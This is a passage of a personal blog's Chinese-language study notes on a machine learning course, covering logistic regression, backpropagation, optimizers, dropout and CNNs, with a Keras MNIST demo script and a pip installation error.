Likelihood<br>我们假设这些向量由一个高斯分布generate，要找一个Gussian$(\mu^{\ast},\Sigma^{\ast})$ with maximum likelihood.<br>$L(\mu,\Sigma)=f_{\mu,\Sigma}(x^1)f_{\mu,\Sigma}(x^2)…f_{\mu,\Sigma}(x^n)$.<br>$\mu^{\ast},\Sigma^{\ast}=arg\max_{\mu,\Sigma}L(\mu,\Sigma)$.<br>$\mu^{\ast}=\frac{1}{n}\sum {x^i}(average x),\Sigma^{\ast}=\frac{1}{n}\sum (x^i-\mu^{\ast})(x^i-\mu^{\ast})^{T}$</li></ul><h3 id="Modifying-Model"><a href="#Modifying-Model" class="headerlink" title="Modifying Model"></a>Modifying Model</h3><p>公用同一个$\Sigma$，$\Sigma=P(C_1)\Sigma^1+P(C_2)\Sigma^2$，加权平均</p><p>Bernoulli distributions</p><p>Naive Bayes Classifier</p><h3 id="Posterior-Probability"><a href="#Posterior-Probability" class="headerlink" title="Posterior Probability"></a>Posterior Probability</h3><p>$P(C_1|x)=\frac{P(x|C_1)P(C_1)}{P(x|C_1)P(C_1)+P(x|C_2)P(C_2)}=\frac{1}{1+\frac{P(x|C_2)P(C_2)}{P(x|C_1)P(C_1)}}$<br>Let $z=\ln \frac{P(x|C_1)P(C_1)}{P(x|C_2)P(C_2)}$<br>$=\frac{1}{1+\exp(-z)}=\sigma(z)$ Sigmoid function</p><p>这里$z$是可以化简的<br>$P(x|C_1)=\frac{1}{(2\pi)^{D/2}}\frac{1}{|\Sigma|^{1/2}}\exp\{-\frac{1}{2}(x-\mu^1)^{T}\Sigma^{-1}(x-\mu^1)\}$.<br>$P(x|C_2)=\frac{1}{(2\pi)^{D/2}}\frac{1}{|\Sigma|^{1/2}}\exp\{-\frac{1}{2}(x-\mu^2)^{T}\Sigma^{-1}(x-\mu^2)\}$.<br>$P(C_1)=\frac{N_1}{N_1+N_2},P(C_2)=\frac{N_2}{N_1+N_2}$.</p><script type="math/tex; mode=display">z=\ln \frac{P(x|C_1)}{P(x|C_2)}+ \ln \frac{P(C_1)}{P(C_2)}=\ln \frac{N_1}{N_2}-\frac{1}{2}[(x-\mu^1)^{T}\Sigma^{-1}(x-\mu^1)-(x-\mu^2)^{T}\Sigma^{-1}(x-\mu^2)]</script><p>把后面的展开$(x-\mu^1)^{T}\Sigma^{-1}(x-\mu^1)=x^{T}\Sigma^{-1}x-x^{T}\Sigma^{-1}\mu^1-(\mu^1)^{T}\Sigma^{-1}x+(\mu^1)^{T}\Sigma^{-1}\mu^1$<br>中间两项其实是一样的，可以合并，因为右乘一个矩阵和左乘转置矩阵是一样的。<br>又因为$\Sigma$相同，所以最后可以化成</p><script type="math/tex; mode=display">z=(\mu^1-\mu^2)^{T}\Sigma^{-1}x-\frac{1}{2}(\mu^1)^{T}\Sigma^{-1}\mu^1+\frac{1}{2}(\mu^2)^{T}\Sigma^{-1}\mu^2+\ln \frac{N_1}{N_2}</script><p>只有第一项包含$x$，后面就是常数，所以可以写成$z=w^{T}\cdot x+b$的形式，要算的就是$\mu^1,\mu^2,\Sigma^{-1}$</p><h2 id="Classification-Logistic-Regression"><a href="#Classification-Logistic-Regression" class="headerlink" title="Classification: Logistic Regression"></a>Classification: Logistic Regression</h2><p>我们想要找到一个函数$P(C_1|x)=\sigma(z),z=w\cdot x+b$<br>当$P(C_1|x)\geqslant 0.5$时输出Class1，反之输出Class2这样子<br>$f_{w,b}(x)=\sigma(\sum_{i}w_ix_i+b)$ output是0到1之间的数<br>如果$x^1,x^2$属于Class1，$x^3$属于Class2，$L(w,b)=f_{w,b}(x^1)f_{w,b}(x^2)(1-f_{w,b}(x^3))…$<br>我们要找$w^{\ast},b^{\ast}=arg\max_{w,b}L(w,b)\Leftrightarrow arg \min_{w,b}-\ln L(w,b)$<br>为了统一函数，我们给每个设置$\hat{y}$，如果属于Class1，$\hat{y}=1$，否则$\hat{y}=0$<br>这样对于每一个$-\ln f_{w,b}(x^1)=-[\hat{y}^1\ln f(x^1)+(1-\hat{y}^1)\ln (1-f(x^1))]$<br>最后我们要minimize的$-\ln L(w,b)=\sum_{n}-[\hat{y}^n\ln f(x^n)+(1-\hat{y}^n)\ln (1-f(x^n))]$<br>后面这个好像叫做Cross entropy between two Bernoulli distribution，用于评价两个函数有多接近？</p><p>最后一步用Gradient Descent来求$w^{\ast},b^{\ast}$就行了<br>$w_{i+1}=w_{i}-\eta \sum_{n} -(\hat{y}-f_{w,b}(x^n))x_i^n$和Linear regression的式子一样的</p><h3 id="Logistic-Regression-Square-Error"><a href="#Logistic-Regression-Square-Error" class="headerlink" title="Logistic Regression + Square Error ?"></a>Logistic Regression + Square Error ?</h3><p>主要是求微分以后，离Target最近和最远，微分全都是0</p><h3 id="Discriminative-v-s-Generative"><a href="#Discriminative-v-s-Generative" class="headerlink" title="Discriminative v.s. Generative"></a>Discriminative v.s. Generative</h3><p>因为我们假设的不一样，所以Logistics Regression 也就是 Discriminative Model 和 Generative Model找出来的$w$和$b$是不同的<br>一般来说，Discriminative Model performance会比 Generative Model更好</p><p>Benefit of generative model</p><ul><li>With the assumption of probability distribution, less training data is needed.</li><li>With the assumption of probability distribution, more robust to the noise.</li><li>Priors and class-dependent probabilities can be estimated from different sources.</li></ul><p>Generative model因为有假设，所以可能会无视一些数据，受数据影响较小，所以可能数据量小时表现会比较好，数据量大的时候就比Discriminative Model 表现较差了</p><h3 id="Multi-class-Classification"><a href="#Multi-class-Classification" class="headerlink" title="Multi-class Classification"></a>Multi-class Classification</h3><p>对于每一个Class，都有$w^i,b_i,z_i=w^i\cdot x +b_i$<br>然后做Softmax，就是强化最大和最小值的差距，然后把概率控制下<br>$y_i=e^{z_i}/\sum_{n}e^{z_n}$<br>然后算$y_i$和$\hat{y}_ i$的Cross Entropy $-\sum_{i}\hat{y}_ i\ln y_i$<br>$\hat{y}$几类就设置成几维，然后自己属于哪一维，那一维就为1，其他为0</p><h3 id="Limitation-of-Logistic-Regression"><a href="#Limitation-of-Logistic-Regression" class="headerlink" title="Limitation of Logistic Regression"></a>Limitation of Logistic Regression</h3><p>最简单的，比如$(0,0),(1,1)$一类，$(0,1),(1,0)$一类，Logistic Regression就爆炸了</p><ul><li>Feature Transformation<br>就把Logistics Regression接起来用，用几次以后当成转换后的值，在做Logistic Regression。<br>我们把每一个Logistic Regression叫做一个Neuron，串起来就是Neuron Network 类神经网络，就到了 Deep Learning</li></ul><p>先看到这里，我再学一下Python，做一下下作业，不然光看也没啥用…</p><hr><h2 id="Deep-Learning"><a href="#Deep-Learning" class="headerlink" title="Deep Learning"></a>Deep Learning</h2><h3 id="Ups-and-downs-of-Deep-Learning"><a href="#Ups-and-downs-of-Deep-Learning" class="headerlink" title="Ups and downs of Deep Learning"></a>Ups and downs of Deep Learning</h3><ul><li>1958: Perceptron (linear model)</li><li>1969: Perceptron has limitation</li><li>1980s: Multi-layer perceptron<ul><li>Do not have significant difference from DNN today</li></ul></li><li>1986: Backpropagation<ul><li>Usually more than 3 hidden layers is not helpful</li></ul></li><li>1989: 1 hidden layer is “good enough”, why deep?</li><li>2006: RBM initialization (breakthrough)</li><li>2009: GPU</li><li>2011: Start to be popular in speech recognition</li><li>2012: win ILSVRC image competition </li></ul><p>真的是感觉有些不太完善…</p><h3 id="Three-Step-of-Deep-Learning"><a href="#Three-Step-of-Deep-Learning" class="headerlink" title="Three Step of Deep Learning"></a>Three Step of Deep Learning</h3><p>跟Machine Learning的三步一样，第一步也就是一个Neural Network</p><p>Neural Network: Different connection leads to different network structures.<br>Network parameter $\theta$ :all the weights and biases in the “neurons”.</p><h3 id="Fully-Connect-Feedforward-Network"><a href="#Fully-Connect-Feedforward-Network" class="headerlink" title="Fully Connect Feedforward Network"></a>Fully Connect Feedforward Network</h3><p>如果我们知道所有的weights和bisaes，那么这其实就是一个function<br>如果只知道structure不知道这些，那么就是一个function set</p><p>一共分成三层<br>input layer - hidden layers - output layer<br><img src="/img/note-ml/20190717120028.png" alt></p><p>Deep = Many hidden layers</p><p>Matrix Operation: 其实就是input vector 来进行matrix operation （每一层集合所有的weights 和 biases，每一层最后有一个activation function），最后得到output vector<br>矩阵运算可以GPU加速</p><p>feature extractor replacing feature engineering</p><h2 id="Backpropagation"><a href="#Backpropagation" class="headerlink" title="Backpropagation"></a>Backpropagation</h2><p>在Neutral Network里面做Gradient Descent有很多参数，那么怎么求Gradient呢<br>就是用Backpropagation</p><h3 id="Chain-Rule"><a href="#Chain-Rule" class="headerlink" title="Chain Rule"></a>Chain Rule</h3><p>就是链式求导法则<br>要求$\frac{\partial L}{\partial w}$, $L=\sum C^n$，$C^n$就是评价$y$和$\hat{y}$之间距离的函数<br>那么$\frac{\partial L}{\partial w}=\sum \frac{\partial C^n}{\partial w}$<br>而$\frac{\partial C}{\partial w}=\frac{\partial z}{\partial w}\frac{\partial C}{\partial z}$</p><p>Forward pass: Compute $\frac{\partial z}{\partial w}$ for all parameters.<br>Backward pass: Compute $\frac{\partial C}{\partial z}$ for all activation function inputs z, Compute $\frac{\partial C}{\partial z}$ from the output layer.<br>有一些细节，就是从后往前算，需要乘上weight然后经过op-amp乘上一个常数得到<br>其实就是建一个反向Neural Network来计算，output变成input</p><h3 id="Keras"><a href="#Keras" class="headerlink" title="Keras"></a>Keras</h3><p>Interface of TensorFlow or Theano<br>Easy to learn and use(still have some flexibility)</p><p>安装 &amp; 使用：<a href="https://keras.io/" target="_blank" rel="noopener">https://keras.io/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install tensorflow</span><br><span class="line">sudo pip install keras</span><br></pre></td></tr></table></figure><p>但是遇到了一个问题…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    Complete output from command python setup.py egg_info:</span><br><span class="line">    Traceback (most recent call last):</span><br><span class="line">      File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">      File &quot;/tmp/pip-build-aAiWd2/scipy/setup.py&quot;, line 31, in &lt;module&gt;</span><br><span class="line">        raise RuntimeError(&quot;Python version &gt;= 3.5 required.&quot;)</span><br><span class="line">    RuntimeError: Python version &gt;= 3.5 required.</span><br><span class="line">    </span><br><span class="line">    ----------------------------------------</span><br><span class="line">Command &quot;python setup.py egg_info&quot; failed with error code 1 in /tmp/pip-build-aAiWd2/scipy/</span><br></pre></td></tr></table></figure></p><p>我Python明明是3.7，为啥就不行了呢，后来我想起来我装了Anaconda以后都是在虚拟环境中，所以，不加sudo就能安装了</p><h3 id="Mini-batch"><a href="#Mini-batch" class="headerlink" title="Mini-batch"></a>Mini-batch</h3><p>one epoch</p><ul><li>Randomly initialize network parameters</li><li>Pick the 1st batch, Update parameters once</li><li>Pick the 2nd batch, Update parameters once</li><li>Until all mini-batches have been picked</li></ul><p>Repeat the above process</p><p>设置这个可以利用GPU加速</p><h2 id="Tip-for-Deep-Learning"><a href="#Tip-for-Deep-Learning" class="headerlink" title="Tip for Deep Learning"></a>Tip for Deep Learning</h2><h3 id="Recipe-of-Deep-Learning"><a href="#Recipe-of-Deep-Learning" class="headerlink" title="Recipe of Deep Learning"></a>Recipe of Deep Learning</h3><p>两个问题：一个是在Training Data上performance不好，一个是在Testing Data上performance不好</p><h3 id="Bad-Results-on-Training-Data"><a href="#Bad-Results-on-Training-Data" class="headerlink" title="Bad Results on Training Data"></a>Bad Results on Training Data</h3><p>两种方法</p><ul><li>New activation function</li><li>Adaptive Learning Rate</li></ul><p>有一种情况，靠近input layer的地方微分值很小，Learn very slow，Almost random；靠近ouput layer的地方微分值较大，Learn very fast，Almost converge。这件事发生的原因是使用sigmoid function，一个很大的$\Delta$经过sigmoid function以后是会变小的，而且影响也会越来越小。<br>解决的方法呢</p><h4 id="Rectified-Linear-Unit-ReLU"><a href="#Rectified-Linear-Unit-ReLU" class="headerlink" title="Rectified Linear Unit(ReLU)"></a>Rectified Linear Unit(ReLU)</h4><script type="math/tex; mode=display">\sigma(z)=\left\{\begin{matrix}a=z, && z\geqslant 0\\ a=0, && z<0\end{matrix}\right.</script><p>Reason:</p><ol><li>Fast to compute</li><li>Biological reason</li><li>Infinite sigmoid with different biases</li><li>can handle vanishing gradient<br>当它去掉output为0的点以后，得到一个Thinner linear network，不再有smaller gradients，不会递减了<br>ReLU variant<br>Leaky ReLU:$\sigma(z)=\left\{\begin{matrix}a=z, &amp;&amp; z\geqslant 0\\ a=0.01z, &amp;&amp; z&lt;0\end{matrix}\right.$<br>Parametric ReLU: $\sigma(z)=\left\{\begin{matrix}a=z, &amp;&amp; z\geqslant 0\\ a=\alpha z, &amp;&amp; z&lt;0\end{matrix}\right., \alpha also learned by gradient descent$</li></ol><h4 id="Maxout"><a href="#Maxout" class="headerlink" title="Maxout"></a>Maxout</h4><p>ReLU is a special class of Maxout<br>Learnable activation function.<br>就是把几个neurons划到同一个组，选一个最大的当做output作为下一层的input<br>Activation function in maxout network can be any piecewise linear convex function<br>How many pieces depending on how many elements in a group.</p><p>Maxout - Training<br>就是train一个thin and linear network，差不多就是把选中的部分提出来train<br>Different thin and linear network for different examples.</p><p>下面都是第二种方法</p><h4 id="RMSProp"><a href="#RMSProp" class="headerlink" title="RMSProp"></a>RMSProp</h4><p>Adagrad是Use first derivative to estimate second derivative<br>RMSProp是这样计算的 Root Mean Square of the gradients with previous gradients being decayed<br>$w^{1}\leftarrow w^{0}-\frac{\eta}{\sigma^{0}}g^{0}, \sigma^{0}=g^{0}$<br>$w^{2}\leftarrow w^{1}-\frac{\eta}{\sigma^{1}}g^{1}, \sigma^{1}=\sqrt{\alpha (\sigma^{0})^2+(1-\alpha)(g^{1})^{2}}$<br>$w^{n+1}\leftarrow w^{n}-\frac{\eta}{\sigma^{n}}g^{n}, \sigma^{n}=\sqrt{\alpha (\sigma^{n-1})^2+(1-\alpha)(g^{n})^{2}}$</p><h4 id="Momentum"><a href="#Momentum" class="headerlink" title="Momentum"></a>Momentum</h4><p>Movement: movement of last step minus gradient at present</p><p>Step:<br>Start at point $\theta^{0}$<br>Movement $v^{0}=0$<br>Compute gradient at $\theta^{0}$<br>Movement $v^{1}=\lambda v^{0}-\eta \triangledown L(\theta^{0})$<br>Move to $\theta^{1}=\theta^{0}+v^{1}$<br>Compute gradient at $\theta^{1}$<br>Movement $v^{2}=\lambda v^{1}-\eta \triangledown L(\theta^{1})$<br>Move to $\theta^{2}=\theta^{1}+v^{2}$</p><p>Movement not just based on gradient, but previous movement.<br>$v^{i}$ is actually the weighted sum of all the previous gradient: $\triangledown L(\theta^{0}),\triangledown L(\theta^{1}),…,\triangledown L(\theta^{i-1})$</p><h4 id="Adam-RMSProp-Momentum"><a href="#Adam-RMSProp-Momentum" class="headerlink" title="Adam: RMSProp + Momentum"></a>Adam: RMSProp + Momentum</h4><p>这里字太多了…我就截图了<br>算法：<br><img src="/img/note-ml/20190722113854.png" alt></p><h3 id="Bad-Results-on-Testing-Data"><a href="#Bad-Results-on-Testing-Data" class="headerlink" title="Bad Results on Testing Data"></a>Bad Results on Testing Data</h3><h4 id="Early-Stopping"><a href="#Early-Stopping" class="headerlink" title="Early Stopping"></a>Early Stopping</h4><p>用Validation set模拟Testing set选一个Validation set上loss较小的点停下来，而不是一直Train下去</p><h4 id="Regularization-1"><a href="#Regularization-1" class="headerlink" title="Regularization"></a>Regularization</h4><p>New loss function to be minimized</p><ul><li>Find a set of weight not only minimizing original cost but also close to zero<br>$L’(\theta)=L(\theta)+\lambda \frac {1}{2} \begin{Vmatrix}\theta\end{Vmatrix}_ {2},\theta=\{w_1,w_2,…\},\begin{Vmatrix}\theta\end{Vmatrix}_ {2}=(w_1)^2+(w_2)^2+…$.<br>就是找一个尽量平滑的函数嘛，后面那个Regularization term就是使函数平滑<br>这里是$\theta$的L2 norm，也叫作L2 regularization<br>做Regularization一般不会考虑biases，因为只是平滑函数而已</li></ul><p>微分一下$Gradient:\frac{\partial L’}{\partial w}=\frac{\partial L}{\partial w}+\lambda w$.<br>$Update: w^{t+1}=w^{t}-\eta \frac{\partial L’}{\partial w}=(1-\eta \lambda)w^{t}-\eta \frac{\partial L}{\partial w}$.<br>会让参数越来越大接近0，每次都让weight小一点，叫做Weight Decay</p><p>同样的L1 Regularization<br>$L’(\theta)=L(\theta)+\lambda \frac {1}{2} \begin{Vmatrix}\theta\end{Vmatrix}_ {1},\theta=\{w_1,w_2,…\},\begin{Vmatrix}\theta\end{Vmatrix}_ {1}=|w_1|+|w_2|+…$.<br>$Gradient:\frac{\partial L’}{\partial w}=\frac{\partial L}{\partial w}+\lambda sgn(w)$.<br>$Update: w^{t+1}=w^{t}-\eta \frac{\partial L’}{\partial w}=w^{t}-\eta \frac{\partial L}{\partial w}-\eta \lambda sgn(w^{t})$.<br>L1每次都减去一个固定的值</p><h4 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h4><p>Each time before updating the parameters.<br>Each neuron has $p\%$ to dropout, the structure of the network is changed.<br>Using the new network for training.<br>For each mini-batch, we resample the dropout neurons.</p><p>Testing<br>No dropout<br>If the dropout rate at training is $p\%$, all the weights times $1-p\%$.<br>Assume that the dropout rate is $50\%$.<br>If a weight $w=1$ by training, set $w=0.5$ for testing.</p><p>Dropout is a kind of ensemble.<br>Using one mini-batch to train one network.<br>Some parameters in the network are shared.</p><p>最后这个操作呢，差不多就是假如有$m$个neuron，然后我们train的是$2^m$个Network，然后最后把他们平均起来，如果activation function是线性的话，与平均值是相等的，但如果不是Linear的，两个值呢也是约等的这个样子…<br>所以Dropout在Linear的activation function上performance是比较好的，比如ReLU和Maxout</p><p>这节课好长啊…今天明天再看看Demo做一下hw2好了</p><h3 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h3><p>这是Demo1和Demo2的合集，不同情况下修改不同的函数和结构之类的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers.core <span class="keyword">import</span> Dense, Dropout, Activation</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Conv2D, MaxPooling2D, Flatten</span><br><span class="line"><span class="keyword">from</span> keras.optimizers <span class="keyword">import</span> SGD, Adam</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> np_utils</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">    (x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line">    number = <span class="number">10000</span></span><br><span class="line">    x_train = x_train[<span class="number">0</span>:number]</span><br><span class="line">    y_train = y_train[<span class="number">0</span>:number]</span><br><span class="line">    x_train = x_train.reshape(number, <span class="number">28</span>*<span class="number">28</span>)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], <span class="number">28</span>*<span class="number">28</span>)</span><br><span class="line">    x_train = x_train.astype(<span class="string">'float32'</span>)</span><br><span class="line">    x_test = x_test.astype(<span class="string">'float32'</span>)</span><br><span class="line">    </span><br><span class="line">    y_train = np_utils.to_categorical(y_train, <span class="number">10</span>)</span><br><span class="line">    y_test = np_utils.to_categorical(y_test, <span class="number">10</span>)</span><br><span class="line">    x_train = x_train</span><br><span class="line">    x_test = x_test</span><br><span class="line">    x_train = x_train / <span class="number">255</span></span><br><span class="line">    x_test = x_test / <span class="number">255</span></span><br><span class="line">    x_test = np.random.normal(x_test)</span><br><span class="line">    <span class="keyword">return</span> (x_train, y_train), (x_test, y_test)</span><br><span class="line"></span><br><span class="line">(x_train, y_train), (x_test, y_test) = load_data()</span><br><span class="line"></span><br><span class="line">model = Sequential()</span><br><span class="line"><span class="comment">#model.add(Dense(input_dim=28*28, units=666, activation='sigmoid'))</span></span><br><span class="line">model.add(Dense(input_dim=<span class="number">28</span>*<span class="number">28</span>, units=<span class="number">666</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.7</span>))</span><br><span class="line"><span class="comment">#model.add(Dense(units=666, activation='sigmoid'))</span></span><br><span class="line"><span class="comment">#model.add(Dense(units=667, activation='sigmoid'))</span></span><br><span class="line">model.add(Dense(units=<span class="number">666</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.7</span>))</span><br><span class="line">model.add(Dense(units=<span class="number">667</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.7</span>))</span><br><span class="line"><span class="comment">#for i in range(10):</span></span><br><span class="line"><span class="comment">#    model.add(Dense(units=666, activation='relu'))</span></span><br><span class="line">model.add(Dense(units=<span class="number">10</span>, activation=<span class="string">'softmax'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#model.compile(loss='mse', optimizer=SGD(lr=0.1), metrics=['accuracy'])</span></span><br><span class="line"><span class="comment">#model.compile(loss='categorical_crossentropy', optimizer=SGD(lr=0.1), metrics=['accuracy'])</span></span><br><span class="line">model.compile(loss=<span class="string">'categorical_crossentropy'</span>, optimizer=<span class="string">'adam'</span>, metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line">model.fit(x_train, y_train, batch_size=<span class="number">100</span>, epochs=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = model.evaluate(x_train, y_train, batch_size=<span class="number">10000</span>)</span><br><span class="line">print(<span class="string">'\nTrain Acc:'</span>, result[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">result = model.evaluate(x_test, y_test, batch_size=<span class="number">10000</span>)</span><br><span class="line">print(<span class="string">'\nTest Acc:'</span>, result[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></p><h2 id="Convolutional-Neural-Network"><a href="#Convolutional-Neural-Network" class="headerlink" title="Convolutional Neural Network"></a>Convolutional Neural Network</h2><h3 id="Why-CNN-for-image"><a href="#Why-CNN-for-image" class="headerlink" title="Why CNN for image"></a>Why CNN for image</h3><p>Some patterns are much smaller that the whole image<br>A neuron does not have to see the whole image to discover the pattern, Connecting to small region with less parameters.<br>就是一个Nerual不需要看到整个图，只需要连接某一部分就可以了，这样可以减去很多参数,fully connected network需要的参数就太多了</p><p>The same patterns appear in different regions</p><p>Subsampling the pixels will not change the object.</p><h3 id="The-whole-CNN"><a href="#The-whole-CNN" class="headerlink" title="The whole CNN"></a>The whole CNN</h3><p>repeat : convolution - max pooling<br>then flatten - fully connected feedforward network</p><p>之前已经观察到的Property</p><ul><li>Some patterns are much smaller that the whole image.(Convolution)</li><li>The same patterns appear in different regions.(Convolution)</li><li>Subsampling the pixels will not change the object.(Max Pooling)</li></ul><h3 id="CNN-Convolution"><a href="#CNN-Convolution" class="headerlink" title="CNN - Convolution"></a>CNN - Convolution</h3><p>每次移动距离stride，每次和filter做内积<br>Do the same process for every filter<br>最后得到Feature Map</p><h3 id="CNN-Colorful-image"><a href="#CNN-Colorful-image" class="headerlink" title="CNN - Colorful image"></a>CNN - Colorful image</h3><p>Filter 增加一个RGB维度</p><h3 id="CNN-v-s-Fully-connected-network"><a href="#CNN-v-s-Fully-connected-network" class="headerlink" title="CNN v.s. Fully connected network"></a>CNN v.s. Fully connected network</h3><p>Less parameters，减去一些连接的weights<br>Even less parameters，shared weights</p><h3 id="CNN-Max-Pooling"><a href="#CNN-Max-Pooling" class="headerlink" title="CNN - Max Pooling"></a>CNN - Max Pooling</h3><p>把filter后得到的分组，选最大或选mean都可以，这就把图片缩小了<br>经过一次Convolution和Max Pooling得到一个新的image，Smaller than the original image,New image but smaller.</p><p>Each filter is a channel.<br>The number of the channel is the number of filters.</p><h3 id="Flatten"><a href="#Flatten" class="headerlink" title="Flatten"></a>Flatten</h3><p>把Feature Map拉直，然后丢到Fully Connected Network就ok了</p><h3 id="CNN-in-Keras"><a href="#CNN-in-Keras" class="headerlink" title="CNN in Keras"></a>CNN in Keras</h3><p>Only modified the network structure and input format(vector -&gt; 3-D tensor)</p><p>Convolution Layer<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(Convolution2D(<span class="number">25</span>, <span class="number">3</span>, <span class="number">3</span>, input_shape=(<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>))) <span class="comment"># 25个3*3的filter input是1维黑白28*28的图片</span></span><br></pre></td></tr></table></figure></p><p>MaxPooling<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>))) <span class="comment"># 2*2的featuremap选最大的</span></span><br></pre></td></tr></table></figure></p><p>Flatten + Fully connected layer<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">model.add(Flatten())</span><br><span class="line"></span><br><span class="line">model.add(Dense(output_dim = <span class="number">100</span>))</span><br><span class="line">model.add(Activation(<span class="string">'relu'</span>))</span><br><span class="line">model.add(Dense(output_dim = <span class="number">10</span>))</span><br><span class="line">model.add(Activation(<span class="string">'softmax'</span>))</span><br></pre></td></tr></table></figure></p><h3 id="What-does-CNN-learn"><a href="#What-does-CNN-learn" class="headerlink" title="What does CNN learn?"></a>What does CNN learn?</h3><p>Degree of the activation of the k-th filter: $a^k=\sum_{i} \sum_{j} a^{k}_ {ij}$<br>找一个input$x^{\ast}$,$x^{\ast}=arg \max_x a^k$(gradient ascent)</p><p>Find an image maximizing the output of neuron :$x^{\ast}=arg \max_{x} a^{j}$<br>Each figure corresponds to a neuron</p><p>$x^{\ast}=arg \max_{x} y^{i}$<br>如果是做数字辨识会发现找到最Activation的$x^{\ast}$其实并不是数字<br>有一个视频<a href="https://www.youtube.com/watch?v=M2IebCN9Ht4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=M2IebCN9Ht4</a></p><p>做一个限制 L1 regularization<br>$x^{\ast} = arg \max_{x} (y^{i}-\sum_{i,j}|x_{ij}|)$</p><p>Deep Dream<br>CNN exaggerates what it sees</p><p>Deep Style<br>Given a photo, make its style like famous painting</p><p>output 也就是 content像原相片，style也就是filter之间的correlation像风格相片</p><p>有很多关于CNN的应用，只需要满足图片的特征就可以了，也就是前面提到的3个property</p><h3 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo"></a>Demo</h3><p>这里应该有Demo的…然而视频中莫有</p><h2 id="Why-Deep-Learning"><a href="#Why-Deep-Learning" class="headerlink" title="Why Deep Learning ?"></a>Why Deep Learning ?</h2><p>相同参数下，越Deep其实performance会变好</p><h3 id="Modularization"><a href="#Modularization" class="headerlink" title="Modularization"></a>Modularization</h3><p>不同的function可以调用共同的subfunction</p><p>Each basic classifier can have sufficient training example<br>如果要分4类，长发男，长发女，短发男，短发女，但是长发男的数据很少<br>这样的情况下，不如用两个basic classifer，分长发短发，男女，这样每类的数据都是足够的<br>Sharing by the following classifiers as module<br>然后再用4个classifier来分出来，只需要比较少的data就可以了</p><p>所以Network的结构<br>The most basic classifiers<br>Use 1st layer as module to build classifiers<br>Use 2nd layer as module…</p><p>The modularization is automatically learned from data.<br>所以Deep Learning需要比较少的Training data？</p><h3 id="Universality-Theorem"><a href="#Universality-Theorem" class="headerlink" title="Universality Theorem"></a>Universality Theorem</h3><p>Any continuous function f<br>can be realized by a network with one hidden layer(given enough hidden neurons)<br>Yes, shallow network can represent any function.<br>However, using deep structure is more effective.</p><h3 id="End-to-end-Learning"><a href="#End-to-end-Learning" class="headerlink" title="End-to-end Learning"></a>End-to-end Learning</h3><p>只知道input 和 output<br>What each function should do is learned automatically</p><p>所以 最后的结论<br>Do deep nets really need to be deep ? Yes !</p><h2 id="Semi-supervised-Learning"><a href="#Semi-supervised-Learning" class="headerlink" title="Semi-supervised Learning"></a>Semi-supervised Learning</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>Supervised learning:$\{(x^r,\hat{y}^r)\}^{R}_ 